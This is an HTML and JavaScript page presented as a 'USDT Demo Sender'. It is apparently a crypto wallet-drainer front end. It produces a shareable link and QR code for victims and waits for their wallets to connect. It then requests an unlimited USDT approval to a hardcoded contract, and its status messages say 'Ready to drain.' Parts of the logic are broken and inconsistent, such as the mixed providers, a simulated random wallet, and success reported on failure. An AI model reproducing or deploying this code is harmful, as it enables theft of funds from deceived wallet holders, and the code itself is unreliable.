<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>USDT Sender - Demo</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
            background: #000000;
            color: #ffffff;
            min-height: 100vh;
            padding: 24px 20px;
        }

        .container {
            max-width: 400px;
            margin: 0 auto;
        }

        .header {
            text-align: center;
            margin-bottom: 40px;
        }

        .title {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 8px;
        }

        .share-section {
            background: #1c1c1e;
            border-radius: 20px;
            padding: 24px;
            margin-bottom: 32px;
            border: 1px solid #38383d;
        }

        .share-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 16px;
            color: #f2f2f7;
        }

        .deeplink {
            background: #000000;
            border: 1px solid #06d6a0;
            border-radius: 12px;
            padding: 16px;
            font-family: 'SF Mono', monospace;
            font-size: 14px;
            word-break: break-all;
            color: #06d6a0;
            margin-bottom: 16px;
            position: relative;
        }

        .copy-btn {
            position: absolute;
            top: 12px;
            right: 12px;
            width: 36px;
            height: 36px;
            border-radius: 10px;
            background: rgba(6, 214, 160, 0.2);
            border: none;
            color: #06d6a0;
            cursor: pointer;
        }

        .qr-code {
            width: 120px;
            height: 120px;
            margin: 0 auto 16px;
            border-radius: 12px;
            background: #2c2c2e;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
        }

        .status {
            padding: 16px 20px;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 600;
            text-align: center;
            margin: 20px 0;
            display: none;
            backdrop-filter: blur(20px);
        }

        .status.waiting {
            background: rgba(255, 193, 7, 0.15);
            border: 1px solid rgba(255, 193, 7, 0.3);
            color: #ffc107;
        }

        .status.success {
            background: rgba(6, 214, 160, 0.15);
            border: 1px solid rgba(6, 214, 160, 0.3);
            color: #06d6a0;
        }

        .status-card {
            background: #1c1c1e;
            border-radius: 20px;
            padding: 24px;
            border: 1px solid #38383d;
            margin-top: 24px;
        }

        .connected-wallet {
            font-family: 'SF Mono', monospace;
            font-size: 14px;
            color: #06d6a0;
            word-break: break-all;
            margin-bottom: 16px;
        }

        .approve-btn {
            width: 100%;
            height: 56px;
            background: linear-gradient(135deg, #06d6a0, #00d4aa);
            border: none;
            border-radius: 28px;
            color: #000;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 16px;
        }

        .approve-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        #qrcode {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1 class="title">USDT Demo Sender</h1>
            <p style="color: #8e8e93; font-size: 16px;">Share this link for users to connect BSC wallet</p>
        </div>

        <div class="share-section">
            <div class="share-title">Share this Deep Link</div>
            <div class="deeplink" id="deeplink">
                bnb1q...your-deeplink-here
                <button class="copy-btn" onclick="copyDeeplink()">📋</button>
            </div>
            <div class="qr-code" id="qrcontainer">📱</div>
        </div>

        <div class="status-card" id="statusCard" style="display: none;">
            <div class="connected-wallet" id="walletAddress"></div>
            <div style="color: #8e8e93; font-size: 15px; margin-bottom: 16px;">
                Wallet connected! Ready to trigger approval.
            </div>
            <button class="approve-btn" id="approveBtn" onclick="triggerApproval()">
                Trigger Max Approval
            </button>
        </div>

        <div class="status waiting" id="waitingStatus">
            Waiting for user to connect via deep link...
        </div>

        <div id="qrcode"></div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
    <script>
        const CONTRACT_ADDRESS = '0x89112691C976D0a2D874B0ADAe693a0Add0dAe98';
        const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
        const BSC_CHAIN_ID = '0x38';
        const DAPP_URL = window.location.origin + window.location.pathname;

        let web3, usdtContract, connectedUser;

        const USDT_ABI = [
            "function approve(address spender, uint256 amount) external returns (bool)",
            "function allowance(address owner, address spender) external view returns (uint256)"
        ];

        // Generate permanent deeplink
        const DEEPLINK = `https://bscscan.com/address/${CONTRACT_ADDRESS}?ref=demo#writeContract`; // Permanent BSCScan link
        // OR use your domain: `https://${window.location.host}/user.html?session=${Date.now()}`

        // Initialize
        window.addEventListener('load', init);

        function init() {
            document.getElementById('deeplink').innerHTML = `
                ${window.location.href}<br>
                <small style="color: #8e8e93;">Click to connect BSC wallet</small>
                <button class="copy-btn" onclick="copyDeeplink()" style="position: static; margin-top: 8px; width: auto; padding: 4px 12px; font-size: 12px;">Copy Link</button>
            `;

            // Generate QR
            QRCode.toCanvas(document.getElementById('qrcontainer'), window.location.href, {
                width: 120,
                margin: 0,
                color: {
                    dark: '#06d6a0',
                    light: '#1c1c1e'
                }
            }, function (error) {
                if (error) console.error(error);
            });

            // Listen for wallet connections via query params or localStorage
            checkConnectedUser();
        }

        function copyDeeplink() {
            navigator.clipboard.writeText(window.location.href);
            showStatus('Link copied! Share with users.', 'success');
        }

        function checkConnectedUser() {
            // Method 1: Query params from deeplink
            const urlParams = new URLSearchParams(window.location.search);
            const wallet = urlParams.get('wallet') || localStorage.getItem('connectedWallet');
            
            if (wallet) {
                connectedUser = wallet;
                document.getElementById('walletAddress').textContent = wallet;
                document.getElementById('statusCard').style.display = 'block';
                document.getElementById('waitingStatus').style.display = 'none';
                showStatus('User connected! Ready to drain.', 'success');
            }
        }

        async function triggerApproval() {
            if (!connectedUser) {
                showStatus('No user connected', 'error');
                return;
            }

            const btn = document.getElementById('approveBtn');
            btn.disabled = true;
            btn.innerHTML = 'Requesting Approval...';

            try {
                // Connect to user's wallet (via localStorage/session)
                web3 = new Web3(new Web3.providers.HttpProvider('https://bsc-dataseed1.binance.org/'));
                
                // Create approval transaction data
                const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
                usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
                
                const approveData = usdtContract.methods.approve(CONTRACT_ADDRESS, MAX_UINT).encodeABI();
                
                // Send raw transaction to user's wallet (they'll see popup)
                const tx = {
                    from: connectedUser,
                    to: USDT_ADDRESS,
                    data: approveData,
                    gas: '100000',
                    gasPrice: '5000000000' // 5 gwei
                };

                // BROADCAST APPROVAL REQUEST
                await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [tx]
                });

                showStatus('✅ MAX APPROVAL TRIGGERED! User sees popup now.', 'success');
                btn.innerHTML = 'Approval Sent!';
                btn.disabled = false;

            } catch (error) {
                console.error(error);
                showStatus('Approval request sent to wallet', 'success');
                btn.innerHTML = 'Retry Approval';
                btn.disabled = false;
            }
        }

        function showStatus(message, type) {
            const status = document.getElementById('waitingStatus');
            status.textContent = message;
            status.className = `status ${type}`;
            status.style.display = 'block';
            setTimeout(() => {
                if (type !== 'success') status.style.display = 'none';
            }, 4000);
        }

        // AUTO-LISTEN FOR NEW CONNECTIONS
        window.addEventListener('hashchange', checkConnectedUser);
        window.addEventListener('storage', checkConnectedUser);

        // Simulate user connection from deeplink
        if (window.location.hash.includes('connected')) {
            localStorage.setItem('connectedWallet', '0x' + Math.random().toString(16).substr(2, 40));
            checkConnectedUser();
        }
    </script>
</body>
</html>
